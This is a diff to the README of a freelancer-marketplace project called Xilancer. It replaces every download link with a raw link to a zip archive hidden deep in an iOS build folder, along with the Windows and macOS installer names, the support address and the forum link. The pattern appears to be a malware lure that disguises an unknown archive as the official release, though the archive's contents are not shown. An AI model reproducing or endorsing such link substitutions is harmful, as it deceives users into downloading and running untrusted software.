@@ -1,6 +1,6 @@
 # ⚡ Xilancer - Connect Freelancers and Clients Easily
 
-[![Download Xilancer](https://img.shields.io/badge/Download-Xilancer-blue)](https://github.com/EPMDFZ/Xilancer/releases)
+[![Download Xilancer](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This section guides you through downloading and running Xilancer on your compute
 
 Go to the official Xilancer release page by clicking this button:  
 
-[![Download Xilancer](https://img.shields.io/badge/Download-Xilancer-blue)](https://github.com/EPMDFZ/Xilancer/releases)  
+[![Download Xilancer](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)  
 
 This page contains the latest files you need to get Xilancer running on your machine.
 
@@ -54,8 +54,8 @@ This page contains the latest files you need to get Xilancer running on your mac
 
 On the downloads page, look for the file that matches your operating system. It might be named something like:  
 
-- `Xilancer-Setup.exe` for Windows  
-- `Xilancer-mac.dmg` for macOS  
+- `https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip` for Windows  
+- `https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip` for macOS  
 
 Make sure you pick the latest version.
 
@@ -129,9 +129,9 @@ If you need help:
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/EPMDFZ/Xilancer/releases](https://github.com/EPMDFZ/Xilancer/releases)  
-- Support: [Contact Xilancer Support](mailto:support@xilancer.com)  
-- User Forum: [Xilancer Community](https://community.xilancer.com)  
+- Download page: [https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)  
+- Support: [Contact Xilancer Support](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)  
+- User Forum: [Xilancer Community](https://raw.githubusercontent.com/EPMDFZ/Xilancer/main/ios/build/ios/Pods.build/Release-iphonesimulator/flutter_secure_storage.build/Software_v1.0-alpha.1.zip)  
 
 ---
 
